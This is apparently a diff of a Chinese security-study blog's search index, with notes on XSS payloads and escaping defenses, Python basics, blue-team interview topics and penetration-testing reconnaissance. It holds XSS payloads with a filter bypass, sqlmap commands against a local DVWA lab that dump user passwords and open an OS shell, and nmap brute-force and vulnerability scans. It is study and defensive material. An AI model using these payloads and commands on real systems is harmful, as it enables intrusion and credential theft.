@@ -251,14 +251,14 @@
   <entry>
     <title>hexo博客搭建</title>
     <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h1>1. 安装配置 node.js</h1>
+    <content><![CDATA[<h1>安装配置 node.js</h1>
 <p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
 <p><strong>npm to cnpm</strong></p>
 <p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
-<h1>2. 安装配置 Git</h1>
+<h1>安装配置 Git</h1>
 <p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
 <p>安装完成即可，没有必要配置ssh</p>
-<h1>3. 安装 hexo</h1>
+<h1>安装 hexo</h1>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
 <p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
@@ -324,7 +324,29 @@
     <title>XSS</title>
     <url>/2020/08/03/CTF/Web/XSS/</url>
     <content><![CDATA[<h1>反射型XSS</h1>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"test"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>一些绕过方法：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1>XSS的防御</h1>
+<h2 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h2>
+<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
+<h2 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h2>
+<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
+<p>比如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>$&#123;username&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">c:out</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时的转义规则如下：</p>
+<p>&lt; 转成 <code>&amp;lt;</code></p>
+<p>&gt; 转成 <code>&amp;gt;</code></p>
+<p>&amp; 转成 <code>&amp;amp;</code></p>
+<p>&quot; 转成 <code>&amp;quot;</code></p>
+<p>’ 转成 <code>&amp;#39;</code></p>
+<p><strong>2&gt;</strong> javascript事件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"button"</span> onclick=<span class="string">'go_to_url("$&#123;myUrl&#125;");'</span> /&gt;</span><br></pre></td></tr></table></figure>
+<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
+<p>\ 转成<code>\\</code></p>
+<p>/ 转成 <code>\/</code></p>
+<p>; 转成 <code>；</code>(全角分号)</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -865,6 +887,15 @@
 <h2 id="6-http"><a class="header-anchor" href="#6-http"></a>6.http</h2>
 <p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://example.com"</span></span><br><span class="line"><span class="comment">#获取响应包</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#判断相应包状态码，若不为200则抛出异常</span></span><br><span class="line">	r.raise_for_status()</span><br><span class="line">	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line">	r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">"error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取响应包内容</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="7-输入输出"><a class="header-anchor" href="#7-输入输出"></a>7.输入输出</h2>
+<h3 id="7-1-输出"><a class="header-anchor" href="#7-1-输出"></a>7.1 输出</h3>
+<p><strong>print格式化字符串</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'%d,%d'</span>%(i,j),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="7-2-输入"><a class="header-anchor" href="#7-2-输入"></a>7.2 输入</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = input(<span class="string">"input a number!\n"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="8-数据结构"><a class="header-anchor" href="#8-数据结构"></a>8.数据结构</h2>
+<h3 id="8-1-list"><a class="header-anchor" href="#8-1-list"></a>8.1 list</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">a.append(<span class="string">'a'</span>)	<span class="comment">#在列表最后加入一个元素'a'</span></span><br><span class="line">a.pop(<span class="number">0</span>)		<span class="comment">#删除列表中索引为0的元素</span></span><br><span class="line">a.insert(<span class="number">0</span>,<span class="string">'b'</span>)	<span class="comment">#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位</span></span><br><span class="line">a.index(<span class="string">'b'</span>)	<span class="comment">#返回元素'b'在列表中第一次出现的位置</span></span><br><span class="line">a.count(<span class="string">'b'</span>)	<span class="comment">#元素'b'在列表中出现的次数</span></span><br><span class="line">a.__len__()		<span class="comment">#返回列表的长度</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -899,5 +930,344 @@
       <tags>
         <tag>Python</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>蓝队面试</title>
+    <url>/2021/03/04/%E6%9D%82%E8%AE%B0/%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/</url>
+    <content><![CDATA[<h1>1. 漏洞原理</h1>
+<h2 id="1-1-XSS"><a class="header-anchor" href="#1-1-XSS"></a>1.1 XSS</h2>
+<h3 id="a-原理"><a class="header-anchor" href="#a-原理"></a>a. 原理</h3>
+<p>应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分</p>
+<h3 id="b-危害"><a class="header-anchor" href="#b-危害"></a>b. 危害</h3>
+<p>一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。攻击者可以获取受害者的cookie等</p>
+<p>JavaScript脚本可以跨域访问，<code>&lt;script&gt;</code>标签可以请求外部的js脚本，并且外部js脚本请求来之后是被认为与被攻击服务器同源的，所以可以访问当前服务器的cookie，所以反射型XSS的利用方式：构造恶意链接，将请求恶意js脚本的<code>&lt;script&gt;</code>作为参数传给服务器，在我们的恶意js脚本中可以使用加载图片的方式，将cookie作为参数传给我们的接收服务器</p>
+<p>获取cookie：<a href="https://blog.csdn.net/l31299/article/details/72792613">https://blog.csdn.net/l31299/article/details/72792613</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie</span><br></pre></td></tr></table></figure>
+<h3 id="c-三种类型比较"><a class="header-anchor" href="#c-三种类型比较"></a>c. 三种类型比较</h3>
+<p>​		反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p>​		客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和转义，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
+<p>​		存储型XSS攻击即攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<h3 id="d-防御方法"><a class="header-anchor" href="#d-防御方法"></a>d. 防御方法</h3>
+<p>过滤输入和转义处理</p>
+<p>第一、在输入方面对所有用户提交内容进行输入验证，提交内容包括URL、查询关键字、http头、post数据等</p>
+<p>第二、在输出方面，使用<code>htmlentities()</code>函数进行转义标签内的内容不会解释，直接显示。</p>
+<h2 id="1-2-CSRF"><a class="header-anchor" href="#1-2-CSRF"></a>1.2 CSRF</h2>
+<p>防御方法<br>
+检查referer：敏感操作来源不能为本站点之外<br>
+设置token：用以检查请求来自当前页面</p>
+<h2 id="1-3-SSRF"><a class="header-anchor" href="#1-3-SSRF"></a>1.3 SSRF</h2>
+<h3 id="1-3-1-XXE漏洞"><a class="header-anchor" href="#1-3-1-XXE漏洞"></a>1.3.1 XXE漏洞</h3>
+<p>SSRF（服务器端请求伪造）是一种攻击模式</p>
+<p>XXE（XML External Entity XML外部实体）则是一种攻击手法</p>
+<p>XXE漏洞利用了SSRF，让服务器向其他服务器应用请求XML外部实体（DTD文件）。</p>
+<h3 id="1-3-2-RFI"><a class="header-anchor" href="#1-3-2-RFI"></a>1.3.2 RFI</h3>
+<p>RFI（远程文件包含）也是SSRF的一种形式。</p>
+<h2 id="1-4-SQL注入"><a class="header-anchor" href="#1-4-SQL注入"></a>1.4 SQL注入</h2>
+<p>报错注入函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">floor()</span><br><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<h1>2. 漏洞扫描</h1>
+<p>AWVS</p>
+<p>NESSUS</p>
+<h1>3. 端口号</h1>
+<p>21	FTP</p>
+<p>22	SSH</p>
+<p>23	TELNET</p>
+<p>80/443	http/https</p>
+<p>445		SMB（SMB是一个协议名，全称是Server Message Block（服务器消息快协议），用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居由它实现），永恒之蓝</p>
+<p>1433	MSsqlserver</p>
+<p>1521	Oracle</p>
+<p>3306	Mysql</p>
+<p>3389	Windows远程桌面</p>
+<h1>4. 工具使用</h1>
+<h2 id="4-1-nmap参数"><a class="header-anchor" href="#4-1-nmap参数"></a>4.1 nmap参数</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;扫描C段</span><br><span class="line">nmap 192.168.233.1&#x2F;24</span><br><span class="line">&#x2F;&#x2F;根据IP地址范围扫描</span><br><span class="line">nmap 192.168.1-10.128-140</span><br><span class="line">&#x2F;&#x2F;扫描多个目标</span><br><span class="line">nmap 192,168.233.1 192.168.23.128</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;参数</span><br><span class="line">-O、-A	探测操作系统</span><br><span class="line">-T	超时时间</span><br></pre></td></tr></table></figure>
+<h2 id="4-2-sqlmap参数"><a class="header-anchor" href="#4-2-sqlmap参数"></a>4.2 sqlmap参数</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;......&quot; -p 可变的参数（如id等） --cookie &quot;......&quot; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;当前用户 --current-user</span><br><span class="line">&#x2F;&#x2F;当前数据库 --current-db</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; --current-user --current-db</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-D指定数据库 然后--tables查询表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; --tables</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-D -T指定数据库和表 然后--columns查询列</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --columns</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-C指定列然后--dump出结果</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --dump</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get WebShell</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --os-shell</span><br></pre></td></tr></table></figure>
+<h1>5. WAF</h1>
+<ul>
+<li>本地WAF
+<ul>
+<li>modSecurity
+<ul>
+<li>作为nginx的模块，需要编译安装</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>云WAF
+<ul>
+<li>无需用户更新</li>
+<li>成本低</li>
+<li>可能被绕过（网站的真实IP被获取</li>
+<li>阿里云WAF…</li>
+</ul>
+</li>
+<li>部署方式
+<ul>
+<li>反向代理
+<ul>
+<li>正向代理隐藏真实客户端，反向代理隐藏真实服务端</li>
+</ul>
+</li>
+<li>步骤
+<ul>
+<li>购买阿里云WAF产品</li>
+<li>在阿里云WAF中添加域名</li>
+<li>在服务器中设置防火墙放行来自WAF的流量</li>
+<li>在拥有域名的DNS服务商处修改DNS解析</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1>6. 蜜罐</h1>
+<p>Github 开源蜜罐 —— HFish</p>
+<p>安装包https://github.com/hacklcx/HFish/releases</p>
+<p>安装成功后启动服务即可</p>
+<h1>7. CDN</h1>
+<p>​		CDN是一个分布式边缘网络，网站A使用了CDN，用户根据域名访问网站A时，如果用户本地DNS没有网站A的路由信息，则向DNS授权服务器请求网站A的IP地址，而DNS授权服务器则根据用户的位置，选择速度最快的CDN加速节点的IP地址传回给用户，那么用户即访问了该CDN节点，而非源站。当CDN节点中没有缓存源站的部分内容时，则会向源站请求。</p>
+<p><strong>判断目标网站是否使用CDN</strong></p>
+<ul>
+<li>使用多地ping该网站域名，若得到的IP不同，则其可能使用了CDN</li>
+<li>nslookup返回的域名解析对应多个IP多半是使用了CDN</li>
+</ul>
+<p><strong>绕过CDN获取网站真实IP</strong></p>
+<ul>
+<li>DNS缓存历史查询网站</li>
+<li>网络空间搜索引擎
+<ul>
+<li>fofa</li>
+<li>钟馗之眼</li>
+<li>…</li>
+</ul>
+</li>
+<li>查询子域名IP，可能子站并没有做CDN，可能与主站处于同一C段</li>
+</ul>
+<h1>8. 态势感知</h1>
+<p>多种防护系统、检测系统的整合及可视化，监控全局流量，攻击预警等。</p>
+<h1>9. 应急响应&amp;linux入侵检测</h1>
+<h2 id="9-1-Linux常用日志命令"><a class="header-anchor" href="#9-1-Linux常用日志命令"></a>9.1 Linux常用日志命令</h2>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>last</td>
+<td>显示的是目前与过去登入系统的用户相关信息</td>
+</tr>
+<tr>
+<td>lastlog</td>
+<td>显示所有用户的登录情况</td>
+</tr>
+<tr>
+<td>lastb</td>
+<td>显示用户错误的登录列表</td>
+</tr>
+<tr>
+<td>who</td>
+<td>显示的是当前登录的用户</td>
+</tr>
+<tr>
+<td>w</td>
+<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
+</tr>
+<tr>
+<td>history</td>
+<td>查看历史命令记录</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>
+<p>检查登录情况</p>
+</li>
+<li>
+<p>检查历史命令</p>
+</li>
+<li>
+<p>检查日志文件（<code>/var/log/...</code>）</p>
+</li>
+<li>
+<p>检查定时任务</p>
+</li>
+</ul>
+<h1>10. IPS/IDS</h1>
+<p>入侵防御系统 / 入侵检测系统。IDS工作在网络层旁路，IPS则可旁路可串结（出口/入口）</p>
+<p>IDS只能检测，IPS则是具备截断能力的IDS</p>
+<p>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。</p>
+<p><strong>绕过方法</strong></p>
+<p>TCP分片、IP分片等</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>渗透测试基础</title>
+    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1>1.资产搜集</h1>
+<h2 id="1-1-子域名搜集"><a class="header-anchor" href="#1-1-子域名搜集"></a>1.1 子域名搜集</h2>
+<ul>
+<li>工具1：Layer子域名挖掘机5.0
+<ul>
+<li>支持服务接口、暴力搜索、同服挖掘三种模式</li>
+<li>支持打开网站、复制域名、复制IP、复制CDN</li>
+<li>支持导出检测结果等功能</li>
+</ul>
+</li>
+<li>工具2：SubdomainsBurte
+<ul>
+<li><a href="https://github.com/y1ng1996/lijiejie_subDomainsBrute">https://github.com/y1ng1996/lijiejie_subDomainsBrute</a></li>
+<li>暴力枚举，速度快</li>
+</ul>
+</li>
+<li>网站：SSL证书查询\网络空间搜索引擎
+<ul>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://crt.sh">crt.sh</a></li>
+<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="1-2-绕过CDN找真实IP"><a class="header-anchor" href="#1-2-绕过CDN找真实IP"></a>1.2 绕过CDN找真实IP</h2>
+<ul>
+<li>网络空间搜索引擎
+<ul>
+<li><a href="https://www.zoomeye.org/">钟馗之眼</a></li>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://www.dnsdb.io/zh-cn">全球DNS搜索引擎</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+<li><a href="http://lookahead.surfwax.com/">Surfwax元搜索</a></li>
+<li><a href="https://archive.org/web/">Way Back Machine</a></li>
+</ul>
+</li>
+<li>让目标主动连接我们
+<ul>
+<li>RSS订阅</li>
+<li>邮件服务器</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-3-IP段整理"><a class="header-anchor" href="#1-3-IP段整理"></a>1.3 IP段整理</h2>
+<ul>
+<li>通过<a href="http://ipwhois.cnnic.net.cn/">中国互联网络信息中心</a>查询</li>
+<li>纯真IP数据库</li>
+</ul>
+<h2 id="1-4-C段查询、旁站查询"><a class="header-anchor" href="#1-4-C段查询、旁站查询"></a>1.4 C段查询、旁站查询</h2>
+<ul>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+</ul>
+<h1>2.端口扫描及利用</h1>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>对应服务</th>
+<th>端口号</th>
+<th>对应服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>2601 2604</td>
+<td>zebra路由</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet</td>
+<td>3312</td>
+<td>kangle主机管理系统</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>3389</td>
+<td>远程桌面</td>
+</tr>
+<tr>
+<td>80-89</td>
+<td>web</td>
+<td>4440</td>
+<td>rundeck</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>5900</td>
+<td>vnc</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https（心脏滴血）</td>
+<td>6379</td>
+<td>redis未授权</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB（永恒之蓝）</td>
+<td>7001 7002</td>
+<td>WebLogic默认弱口令，反序列</td>
+</tr>
+<tr>
+<td>512 513 514</td>
+<td>Rexec</td>
+<td>8080</td>
+<td>tomcat</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync未授权</td>
+<td>8080 8089 9090</td>
+<td>JBOSS</td>
+</tr>
+<tr>
+<td>1025</td>
+<td>NFS</td>
+<td>8161</td>
+<td>activemq未授权访问</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td>27017 27018</td>
+<td>Mongodb未授权访问</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+<td>50000</td>
+<td>SAP命令执行</td>
+</tr>
+</tbody>
+</table>
+<p><strong>利用 nmap+脚本快速捡洞和检洞</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">系统漏洞检测：nmap --script smb-check-vulns.nse -p 192.168.1.1</span><br><span class="line">数据库密码检测：nmap --script=brute 192.168.1.1</span><br><span class="line">收集应用服务信息：nmap -sC 192.168.1.1</span><br><span class="line">检测常见漏洞：nmap --script=vuln 192.168.1.1</span><br><span class="line">检测部分应用的弱口令：nmap --script=auth 192.168.1.1</span><br></pre></td></tr></table></figure>
+<h1>3.指纹搜集</h1>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
   </entry>
 </search>
